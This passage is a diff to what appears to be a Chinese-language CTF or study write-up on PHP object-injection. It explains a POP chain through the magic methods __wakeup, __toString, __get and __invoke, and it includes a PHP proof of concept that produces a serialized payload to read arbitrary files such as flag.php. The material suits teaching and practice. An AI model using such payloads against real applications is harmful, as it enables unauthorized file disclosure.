@@ -171,6 +171,60 @@ else
 }
 ```
 
+#### 分析思路
+
+- 先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（`__invoke`）时可读取文件。
+- 可控的是`get`传入的hello参数，将hello值反序列化，此时会调用`__wakeup`方法，只有Show类中存在该方法。`\_\_wakeup`方法中会对`$this->source`进行正则匹配，此时会将`source`的内容当作字符串处理，即调用`__toString()`方法。
+- `__toString`方法中读取了`$this->str['str']->source`，如果`str['str']`对象中没有`source`这个变量呢？此时就会调用`__get`魔术方法（如果该对象存在这个方法的话）。
+- 观察程序，发现只有Test类有`__get`方法，用Test类继续构造POP链，会调用`$this->p`变量，并将`$this->p`作为函数执行，此时就来到了我们找到的利用点——Read类中的`__invoke`魔术方法！
+
+如此，我们构造好了一条POP链：
+
+`$_GET['hello']->Show.__wakeup->Show.__toString->Test.__get->Read.__invoke->Read.file_get->读取任意文件`
+
+得到POC
+
+```php
+<?php
+    class Read{
+        public $var = "flag.php";
+    }
+    class Show{
+        public $source;
+        public $str;
+    }
+
+    class Test{
+        public $p;
+    }
+
+    $read = new Read();
+    $show = new Show();
+    $test = new Test();
+
+    $show->str['str']=$test; 
+    $test->p=$read;
+    echo serialize($show);
+    echo '
+    ';
+    $show->source=$show; //存疑，这个地方照葫芦画瓢，但不明意思
+    echo serialize($show);
+?>
+```
+
+#### 总结
+
+1. 先观察是否存在利用点
+   1. 可执行命令、文件包含的敏感函数
+   2. 参数可控的变量、入口
+2. 注意所有魔术方法
+3. 将魔术方法执行顺序连成一条链
+4. 确定对象调用顺序，填入对象变量参数，构造POP链
+
+
+
+
+
 
 
 ## 参考
